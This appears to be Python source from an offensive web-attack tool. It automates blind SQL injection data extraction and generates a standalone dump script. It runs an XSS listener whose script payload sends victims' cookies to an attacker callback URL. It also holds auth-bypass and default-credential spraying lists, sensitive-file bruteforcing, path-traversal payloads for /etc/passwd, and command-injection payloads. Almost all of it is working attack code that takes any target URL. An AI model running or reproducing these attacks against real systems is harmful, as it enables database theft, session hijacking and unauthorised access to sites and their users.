log_off = get_logger("offensive")

# ──────────────────────────────────────────────────────────────────────────────
# OFF.1 — SQLi Auto-Exfil (with fixed boolean technique)
# ──────────────────────────────────────────────────────────────────────────────

class SQLiExfiltrator:
    def __init__(self, url: str, param: str, technique: str = "time", engine: str = "MySQL"):
        self.url = url
        self.param = param
        self.technique = technique
        self.engine = engine

    def _inject_boolean(self, condition: str) -> bool:
        """Return True if true‑condition response differs significantly from false‑condition."""
        parsed = urlparse(self.url)
        qs = parse_qs(parsed.query)
        true_sql = f"' OR ({condition})-- -"
        false_sql = f"' AND NOT ({condition})-- -"
        qs_true = dict(qs)
        qs_true[self.param] = [true_sql]
        qs_false = dict(qs)
        qs_false[self.param] = [false_sql]
        url_true = urlunparse(parsed._replace(query=urlencode(qs_true, doseq=True)))
        url_false = urlunparse(parsed._replace(query=urlencode(qs_false, doseq=True)))
        resp_true = get(url_true)
        resp_false = get(url_false)
        if not resp_true or not resp_false:
            return False
        return abs(len(resp_true.content) - len(resp_false.content)) > 20

    def _inject_time(self, condition: str) -> bool:
        parsed = urlparse(self.url)
        qs = parse_qs(parsed.query)
        sleep_sql = {
            "MySQL":      f"' OR IF(({condition}), SLEEP({SLEEP_SECONDS}), 0)-- -",
            "PostgreSQL": f"' OR (CASE WHEN ({condition}) THEN pg_sleep({SLEEP_SECONDS}) ELSE 0 END)-- -",
            "MSSQL":      f"'; IF ({condition}) WAITFOR DELAY '0:0:{SLEEP_SECONDS}'--",
        }.get(self.engine, f"' OR IF(({condition}), SLEEP({SLEEP_SECONDS}), 0)-- -")
        qs[self.param] = [sleep_sql]
        test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        t0 = time.monotonic()
        resp = get(test_url)
        elapsed = time.monotonic() - t0
        return resp is not None and elapsed >= SLEEP_SECONDS * 0.7

    def _inject(self, condition: str) -> bool:
        if self.technique == "time":
            return self._inject_time(condition)
        elif self.technique == "boolean":
            return self._inject_boolean(condition)
        return False

    def _get_length(self, query: str, max_len: int = 256) -> int:
        lo, hi = 0, max_len
        while lo < hi:
            mid = (lo + hi) // 2
            if self._inject(f"LENGTH(({query}))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def _get_char(self, query: str, position: int) -> str:
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if self._inject(f"ASCII(SUBSTRING(({query}),{position},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo) if 32 <= lo <= 126 else "?"

    def extract(self, query: str, label: str, max_len: int = 256) -> str:
        log_off.info(f"SQLi Exfil: extracting {label} via binary search...")
        length = self._get_length(query, max_len)
        log_off.info(f"  Length of {label}: {length}")
        result = ""
        for pos in range(1, length + 1):
            c = self._get_char(query, pos)
            result += c
            if pos % 10 == 0:
                log_off.info(f"  [{label}] position {pos}/{length}: {result}")
        return result

    def run_full_exfil(self) -> dict:
        results = {}
        log_off.info("=" * 60)
        log_off.info("OFFENSIVE SQLi DATA EXFILTRATION")
        log_off.info("=" * 60)
        results["version"] = self.extract("@@version", "DB Version")
        log_off.info(f"[+] DB Version: {results['version']}")
        results["user"] = self.extract("CURRENT_USER()", "DB User")
        log_off.info(f"[+] DB User: {results['user']}")
        results["database"] = self.extract("DATABASE()", "Database Name")
        log_off.info(f"[+] Database: {results['database']}")
        tables = []
        for i in range(1, 11):
            tbl_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {i-1},1"
            tbl_name = self.extract(tbl_query, f"Table #{i}", 64)
            if not tbl_name or tbl_name == "?":
                break
            tables.append(tbl_name)
            log_off.info(f"  Table {i}: {tbl_name}")
            col_query = (f"SELECT GROUP_CONCAT(column_name SEPARATOR '|') FROM information_schema.columns "
                         f"WHERE table_name='{tbl_name}' AND table_schema=DATABASE()")
            columns_raw = self.extract(col_query, f"Columns of {tbl_name}", 512)
            if columns_raw and columns_raw != "?":
                cols = columns_raw.split("|")
                log_off.info(f"    Columns: {', '.join(cols[:8])}")
                if cols:
                    sample_query = f"SELECT {cols[0]} FROM {tbl_name} LIMIT 1"
                    sample = self.extract(sample_query, f"Sample {cols[0]} from {tbl_name}", 128)
                    if sample and sample != "?":
                        log_off.info(f"    Sample ({cols[0]}): {sample}")
        results["tables"] = tables
        log_off.info("[✔] SQLi exfiltration complete\n")
        return results

    def generate_dump_script(self, findings: dict) -> str:
        script = f'''#!/usr/bin/env python3
# Knight Auto-Generated SQLi Dump Script
# Target: {self.url}
# Technique: {self.technique} ({self.engine})

import httpx, time, sys, json, re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

TARGET_URL = "{self.url}"
PARAM = "{self.param}"
SLEEP_SEC = {SLEEP_SECONDS}

def inject(condition):
    parsed = urlparse(TARGET_URL)
    qs = parse_qs(parsed.query)
    payload = f"' OR IF(({{condition}}), SLEEP({SLEEP_SECONDS}), 0)-- -"
    qs[PARAM] = [payload]
    test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
    t0 = time.monotonic()
    try:
        r = httpx.get(test_url, timeout=10, verify=False)
        return time.monotonic() - t0 >= SLEEP_SEC * 0.7
    except:
        return False

def extract(query, label, max_len=256):
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        lo, hi = (mid + 1, hi) if inject(f"LENGTH(({{query}}))>{{mid}}") else (lo, mid)
    length = lo
    print(f"  [{{label}}] Length: {{length}}")
    result = ""
    for pos in range(1, length + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            lo, hi = (mid + 1, hi) if inject(f"ASCII(SUBSTRING(({{query}}),{{pos}},1))>{{mid}}") else (lo, mid)
        result += chr(lo)
    return result

if __name__ == "__main__":
    print("Knight SQLi Dump Script")
    print("=" * 50)
    print("Version:", extract("@@version", "DB Version"))
    print("User:", extract("CURRENT_USER()", "DB User"))
    print("Database:", extract("DATABASE()", "Database"))
    for i in range(1, 20):
        tbl = extract(f"SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {{i-1}},1", f"Table {{i}}", 64)
        if not tbl or tbl == "?":
            break
        print(f"\\nTable {{i}}: {{tbl}}")
        cols = extract(f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{{tbl}}'", "Columns", 512)
        print(f"  Columns: {{cols}}")
'''
        return script


# ──────────────────────────────────────────────────────────────────────────────
# OFF.2 — XSS Cookie Capture (thread‑safe, generates attack URLs)
# ──────────────────────────────────────────────────────────────────────────────

class XSSCookieCapture:
    def __init__(self, listen_port: int = 8081):
        self.port = listen_port
        self.captured = []
        self._lock = threading.Lock()
        self._server = None
        self._thread = None
        self.callback_url = None

    def _get_external_ip(self) -> str:
        try:
            r = httpx.get("https://api.ipify.org?format=text", timeout=5)
            return r.text.strip()
        except:
            return "127.0.0.1"

    class _Handler(http.server.BaseHTTPRequestHandler):
        capture_ref = None

        def do_GET(self):
            parsed = urllib.parse.urlparse(self.path)
            qs = urllib.parse.parse_qs(parsed.query)
            cookie_data = qs.get("c", [None])[0]
            location = qs.get("loc", [None])[0]
            if cookie_data:
                decoded = urllib.parse.unquote(cookie_data)
                entry = {
                    "timestamp": datetime.datetime.now().isoformat(),
                    "cookie": mask_secret(decoded, keep=4),
                    "cookie_sha256": hashlib.sha256(decoded.encode("utf-8", "ignore")).hexdigest(),
                    "source_url": urllib.parse.unquote(location) if location else "unknown",
                    "remote_ip": self.client_address[0],
                }
                if self.capture_ref is not None:
                    with self.capture_ref._lock:
                        self.capture_ref.captured.append(entry)
                log_off.info(f"[XSS CAPTURE] Cookie captured from {entry['source_url']}: {entry['cookie']}")
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-Type", "image/gif")
            self.end_headers()
            self.wfile.write(b"GIF89a\x01\x00\x01\x00\x80\xff\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")

        def log_message(self, *args):
            pass

    def start(self) -> str:
        port = self.port
        while port < 65535:
            try:
                self._Handler.capture_ref = self
                self._server = socketserver.TCPServer(("0.0.0.0", port), self._Handler)
                break
            except OSError:
                port += 1
        if not self._server:
            log_off.error("XSS Capture: could not find available port")
            return None
        self.port = port
        ResourceManager.register_socket(self._server.socket)
        ip = self._get_external_ip()
        self.callback_url = f"http://{ip}:{port}/steal"
        self._thread = Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        log_off.info(f"XSS Capture listener started on {self.callback_url}")
        return self.callback_url

    def generate_attack_url(self, url: str, param: str) -> str | None:
        payload = (f'"><script>new Image().src="{self.callback_url}?c="'
                   f'+encodeURIComponent(document.cookie)+"&loc="'
                   f'+encodeURIComponent(document.URL)</script>')
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        if param in qs:
            qs[param] = [payload]
            attack_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            return attack_url
        return None

    def stop(self):
        if self._server:
            self._server.shutdown()
            self._server.socket.close()
            if self._server.socket in ResourceManager._sockets:
                ResourceManager._sockets.remove(self._server.socket)
            log_off.info("XSS Capture listener stopped")

    def get_captured(self) -> list:
        with self._lock:
            return self.captured[:]


# ──────────────────────────────────────────────────────────────────────────────
# OFF.3 — Auth Bypass (fixed boolean crash)
# ──────────────────────────────────────────────────────────────────────────────

AUTH_BYPASS_PAYLOADS = [
    ("SQLi OR 1=1",         {"username": "' OR '1'='1", "password": "' OR '1'='1"}),
    ("SQLi comment",        {"username": "admin'-- -",  "password": "anything"}),
    ("SQLi union select",   {"username": "' UNION SELECT 1,'admin','hash'-- -", "password": "x"}),
    ("Default admin:admin",  {"username": "admin", "password": "admin"}),
    ("Default admin:password", {"username": "admin", "password": "password"}),
    ("Default admin:1234",   {"username": "admin", "password": "1234"}),
    ("Default root:root",    {"username": "root", "password": "root"}),
    ("Default root:toor",    {"username": "root", "password": "toor"}),
    ("Default test:test",    {"username": "test", "password": "test"}),
    ("Default guest:guest",  {"username": "guest", "password": "guest"}),
    ("Default admin:",       {"username": "admin", "password": ""}),
    ("Default tomcat:tomcat",{"username": "tomcat", "password": "tomcat"}),
    ("Header X-Forwarded-For", {"_header": "X-Forwarded-For: 127.0.0.1"}),
    ("Header X-Real-IP",      {"_header": "X-Real-IP: 127.0.0.1"}),
    ("Header X-Original-URL", {"_header": "X-Original-URL: /admin"}),
]

COMMON_ADMIN_PATHS = [
    "/admin", "/administrator", "/login", "/wp-login.php", "/admin/login.php",
    "/user/login", "/auth", "/signin", "/cpanel", "/manager",
    "/dashboard", "/portal", "/api/auth", "/api/v1/auth",
    "/api/v1/login", "/admin/login.html", "/login.html",
]

def discover_auth_endpoints(base_urls: list[str]) -> list[tuple]:
    auth_endpoints = []
    def probe(path):
        for base in base_urls:
            url = base.rstrip("/") + path
            try:
                r = httpx.get(url, timeout=HTTP_TIMEOUT, verify=False, follow_redirects=False)
                if r.status_code in (200, 301, 302, 401, 403):
                    text = r.text.lower() if hasattr(r, 'text') else ""
                    if any(ind in text for ind in ["password","login","sign in","username","authenticate"]) or r.status_code in (401, 403):
                        return url, r.status_code
            except:
                pass
        return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        for fut in concurrent.futures.as_completed([ex.submit(probe, p) for p in COMMON_ADMIN_PATHS]):
            res = fut.result()
            if res:
                auth_endpoints.append(res)
                log_off.info(f"Auth endpoint found: {res[0]} [{res[1]}]")
    return auth_endpoints

def test_auth_bypass(auth_endpoints: list[tuple]) -> list[dict]:
    findings = []
    for url, _ in auth_endpoints:
        baseline_resp = get(url)
        if not baseline_resp:
            continue
        auth_indicators = ["logout", "dashboard", "welcome", "profile", "account", "my", "settings", "admin"]
        for label, payload in AUTH_BYPASS_PAYLOADS:
            try:
                if "_header" in payload:
                    hdr_key, hdr_val = payload["_header"].split(": ", 1)
                    r = httpx.get(url, headers={hdr_key: hdr_val}, timeout=HTTP_TIMEOUT,
                                  verify=False, follow_redirects=False)
                else:
                    r = httpx.post(url, data=payload, timeout=HTTP_TIMEOUT,
                                   verify=False, follow_redirects=False)
                if not r:
                    continue
                if r.text == baseline_resp.text and r.status_code == baseline_resp.status_code:
                    continue
                # FIX: correct boolean check (no any() on a bool)
                has_session = "Set-Cookie" in r.headers and "session" in r.headers.get("Set-Cookie", "").lower()
                has_auth_content = any(ind in r.text.lower() for ind in auth_indicators)
                if r.status_code in (200, 302, 303) and (has_session or has_auth_content):
                    findings.append({
                        "type": "Auth Bypass",
                        "confidence": f"SUSPECTED — {label}",
                        "url": url,
                        "proof": f"Payload '{label}' returned HTTP {r.status_code}, differs from baseline, has auth indicators.",
                        "repro": f"curl -X POST '{url}' -d 'username=admin&password=admin'",
                        "img": None,
                    })
                    log_off.info(f"[!] Auth bypass candidate: {url} via {label}")
                    break
            except:
                pass
    return findings


# ──────────────────────────────────────────────────────────────────────────────
# OFF.4 — Directory Bruteforce
# ──────────────────────────────────────────────────────────────────────────────

COMMON_DIRS = [
    ".git/", ".git/config", ".git/HEAD", ".svn/", ".env", ".env.production",
    ".env.local", "config.php", "config.json", "configuration.php",
    "settings.php", "db.php", "database.php", "credentials.yml",
    "backup", "backups", "backup.sql", "db.sql", "dump.sql",
    "backup.tar.gz", "backup.zip", "www.zip", "www.tar.gz",
    "admin", "administrator", "admin.php", "cpanel", "dashboard",
    "api", "api/", "api/v1", "api/v2", "graphql", "swagger",
    "openapi.json", "swagger.json",
    "phpmyadmin", "phpPgAdmin", "adminer.php", "pma",
    "phpinfo.php", "info.php", "status.php", "test.php",
    "jenkins", "jira", "confluence", "gitlab", "kibana", "grafana",
    "uploads", "upload", "files", "download", "downloads",
    "robots.txt", "sitemap.xml", "crossdomain.xml",
    "favicon.ico", "index.html", "index.php",
    "wp-admin", "wp-content", "wp-includes", "wp-config.php",
    "manager", "management", "controlpanel", "portal",
]

def dir_bruteforce(base_urls: list[str], turbo: bool = False) -> list[dict]:
    findings = []
    dirs = [d for d in COMMON_DIRS if not turbo or any(d.startswith(p) for p in [".git", ".env", "admin", "backup", "api", "config", "wp-", "php"])]
    tasks = [(b, d) for b in base_urls for d in dirs]
    random.shuffle(tasks)

    def probe(base_url, path):
        url = f"{base_url.rstrip('/')}/{path}"
        try:
            r = httpx.get(url, timeout=HTTP_TIMEOUT, verify=False, follow_redirects=False)
            if r.status_code in (200, 201, 204, 301, 302, 303, 307, 401, 403):
                return url, r.status_code, len(r.content) if hasattr(r, 'content') else 0
        except:
            pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        for fut in concurrent.futures.as_completed([ex.submit(probe, b, d) for b, d in tasks]):
            res = fut.result()
            if res:
                url, status, size = res
                findings.append({
                    "type": f"Endpoint Found — HTTP {status}",
                    "confidence": "SUSPECTED — manual review recommended",
                    "url": url,
                    "proof": f"Discovered {url} — HTTP {status}, {size}b",
                    "repro": f"curl -sI '{url}'",
                    "img": None,
                })
                log_off.info(f"Discovered: {url} [{status}] ({size}b)")
    return findings


# ──────────────────────────────────────────────────────────────────────────────
# OFF.5 — LFI/RFI Scanner
# ──────────────────────────────────────────────────────────────────────────────

LFI_PAYLOADS = [
    ("/etc/passwd",                 "../../../../etc/passwd"),
    ("/etc/passwd deep",            "../../../../../../etc/passwd"),
    ("/etc/hosts",                  "../../../../etc/hosts"),
    ("windows/win.ini",             "../../../../windows/win.ini"),
    ("proc/self/environ",           "../../../../proc/self/environ"),
    ("php://filter b64 index",      "php://filter/convert.base64-encode/resource=index.php"),
    ("php://filter b64 passwd",     "php://filter/convert.base64-encode/resource=/etc/passwd"),
    ("data:// text/plain",          "data://text/plain;base64,PD9waHAgZWNobyAiTEZJIERFVEVDVEVEWyI7ID8+"),
    ("double-encoding passwd",      "..%252f..%252f..%252fetc/passwd"),
    ("null byte passwd",            "../../../../etc/passwd%00"),
]

LFI_SUCCESS_MARKERS = ["root:", "bin:", "daemon:", "nobody:", "www-data:",
                       "[extensions]", "<?php", "PD9waHA", "HTTP_USER_AGENT"]

def scan_lfi_rfi(param_urls: list[str]) -> list[dict]:
    findings = []
    for url in param_urls[:100]:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        for param in qs:
            original = qs[param][0] if qs[param] else ""
            for label, payload in LFI_PAYLOADS:
                qs_copy = dict(qs)
                qs_copy[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(qs_copy, doseq=True)))
                resp = get_following_redirects(test_url)
                if not resp:
                    continue
                found = [m for m in LFI_SUCCESS_MARKERS if m in resp.text]
                if found or ("root" in resp.text and ":" in resp.text and "/bin/" in resp.text):
                    findings.append({
                        "type": "Local File Inclusion",
                        "confidence": "CONFIRMED" if found else "SUSPECTED",
                        "url": test_url,
                        "proof": f"Payload '{label}' returned file contents. Markers: {found[:3]}",
                        "repro": f"curl -s '{test_url}'",
                        "img": None,
                    })
                    log_off.info(f"[!] LFI found: {test_url} with {label}")
                    break
    return findings


# ──────────────────────────────────────────────────────────────────────────────
# OFF.6 — Credential Spraying (uses post() with rate limiting)
# ──────────────────────────────────────────────────────────────────────────────

COMMON_CREDENTIALS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"), ("admin", "admin123"),
    ("admin", "Passw0rd"), ("admin", "Admin@123"), ("admin", "root"), ("admin", ""),
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("test", "test"), ("test", "password"), ("test", "1234"),
    ("guest", "guest"), ("guest", "password"),
    ("administrator", "administrator"), ("administrator", "password"),
    ("demo", "demo"), ("demo", "demo1234"),
    ("tomcat", "tomcat"), ("manager", "manager"),
    ("pi", "raspberry"), ("ubuntu", "ubuntu"),
    ("support", "support"), ("info", "info"),
]

def spray_credentials(auth_endpoints: list[tuple]) -> list[dict]:
    findings = []
    for url, _ in auth_endpoints:
        for username, password in COMMON_CREDENTIALS:
            r = post(url, data={
                "username": username, "password": password,
                "user": username, "pass": password,
                "email": username, "passwd": password,
            })
            if not r:
                continue
            body = r.text.lower() if hasattr(r, 'text') else ""
            success = any(w in body for w in ["dashboard", "welcome", "logged in", "redirecting", "logout"])
            failure = any(w in body for w in ["invalid", "incorrect", "wrong", "failed"])
            if (r.status_code in (301, 302, 303, 307, 308) or success) and not failure:
                findings.append({
                    "type": "Weak Credentials / Default Login",
                    "status": "DETECTED",
                    "confidence": "SUSPECTED — verify manually",
                    "url": url,
                    "proof": f"A common credential pair produced a response consistent with successful authentication (HTTP {r.status_code}); credentials redacted.",
                    "repro": f"manual verification required for {url}; credential pair redacted",
                    "img": None,
                })
                log_off.info(f"[!] Weak credentials: {username}:{password} @ {url}")
                break
            time.sleep(random.uniform(0.5, 1.5))
    return findings


# ──────────────────────────────────────────────────────────────────────────────
# OFF.7 — Command Injection Scanner (unchanged, already solid)
# ──────────────────────────────────────────────────────────────────────────────

UNIX_CMD_PAYLOADS = [
    ("semicolon",   f"; sleep {SLEEP_SECONDS}"),
    ("pipe",        f"| sleep {SLEEP_SECONDS}"),
    ("AND",         f"&& sleep {SLEEP_SECONDS}"),
    ("OR",          f"|| sleep {SLEEP_SECONDS}"),
    ("backtick",    f"`sleep {SLEEP_SECONDS}`"),
    ("subshell",    f"$(sleep {SLEEP_SECONDS})"),
    ("newline",     f"\\nsleep {SLEEP_SECONDS}"),
]

WIN_CMD_PAYLOADS = [
    ("semicolon",        f"; timeout {SLEEP_SECONDS}"),
    ("pipe",             f"| timeout {SLEEP_SECONDS}"),
    ("AND",              f"&& timeout {SLEEP_SECONDS}"),
    ("ping loop",        f"& ping -n {SLEEP_SECONDS + 1} 127.0.0.1 > nul"),
    ("powershell sleep", f"; powershell Start-Sleep -Seconds {SLEEP_SECONDS}"),
    ("newline",          f"\\ntimeout {SLEEP_SECONDS}"),
]

def _detect_os(url: str) -> str:
    try:
        r = httpx.get(url, timeout=HTTP_TIMEOUT, verify=False)
        server = r.headers.get("Server", "").lower()
        if any(x in server for x in ["microsoft-iis", "windows", "asp.net"]):
            return "windows"
        body = (r.text[:500] if hasattr(r, 'text') else "").lower()
        if any(x in body for x in ["asp.net", "iis"]):
            return "windows"
    except:
        pass
    return "unix"

def _median_mad(values: list[float]) -> tuple[float, float]:
    if not values:
        return 0.0, 0.0
    med = statistics.median(values)
    deviations = [abs(v - med) for v in values]
    return med, statistics.median(deviations) if deviations else 0.0

def _confirm_cmd_injection(url: str, param: str, original: str,
                           cmd_label: str, cmd_payload: str) -> dict | None:
    baseline_times = []
    for _ in range(TIME_TRIALS):
        t0 = time.monotonic()
        r = get(url)
        if r: baseline_times.append(time.monotonic() - t0)
    if len(baseline_times) < TIME_TRIALS:
        return None
    baseline_med, baseline_mad = _median_mad(baseline_times)
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    control_value = "' AND '1'='1"
    qs_copy = dict(qs)
    qs_copy[param] = [original + control_value]
    control_url = urlunparse(parsed._replace(query=urlencode(qs_copy, doseq=True)))
    control_times = []
    for _ in range(TIME_TRIALS):
        t0 = time.monotonic()
        r = get(control_url)
        if r: control_times.append(time.monotonic() - t0)
    if len(control_times) < TIME_TRIALS:
        return None
    control_med, control_mad = _median_mad(control_times)
    qs_copy = dict(qs)
    qs_copy[param] = [original + cmd_payload]
    test_url = urlunparse(parsed._replace(query=urlencode(qs_copy, doseq=True)))
    test_times = []
    for _ in range(TIME_TRIALS):
        t0 = time.monotonic()
        r = get(test_url)
        if r: test_times.append(time.monotonic() - t0)
    if len(test_times) < TIME_TRIALS:
        return None
    test_med, test_mad = _median_mad(test_times)
    delta = test_med - control_med
    baseline_jitter = max(baseline_mad, control_mad, 0.05)
    separated = delta >= max(SLEEP_SECONDS * 0.70, baseline_jitter * 4.0)
    close_to_expected = abs(delta - SLEEP_SECONDS) <= max(TIME_TOLERANCE, baseline_jitter * 3.0)
    if separated and close_to_expected:
        return {
            "type": "Command Injection (time-based blind)",
            "status": "CONFIRMED",
            "confidence": f"CONFIRMED — {cmd_label} sleep-delay verified across {TIME_TRIALS} trials",
            "url": test_url,
            "proof": f"Injecting '{cmd_payload}' added {delta:.2f}s median delay; baseline MAD={baseline_mad:.3f}s, control MAD={control_mad:.3f}s, test MAD={test_mad:.3f}s.",
            "repro": f"time curl -s '{test_url}'",
            "img": None,
        }
    return None

def scan_cmd_injection(param_urls: list[str], base_urls: list[str]) -> list[dict]:
    findings = []
    for url in param_urls[:100]:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        if not qs:
            continue
        os_type = _detect_os(url)
        payloads = WIN_CMD_PAYLOADS if os_type == "windows" else UNIX_CMD_PAYLOADS
        if os_type != "windows":
            payloads = payloads + WIN_CMD_PAYLOADS
        for param in qs:
            original = qs[param][0] if qs[param] else ""
            if not original:
                continue
            for cmd_label, cmd_payload in payloads:
                confirmed = _confirm_cmd_injection(url, param, original, cmd_label, cmd_payload)
                if confirmed:
                    findings.append(confirmed)
                    log_off.info(f"CONFIRMED CMD injection: {confirmed['url']} via {cmd_label}")
                    break
    return findings


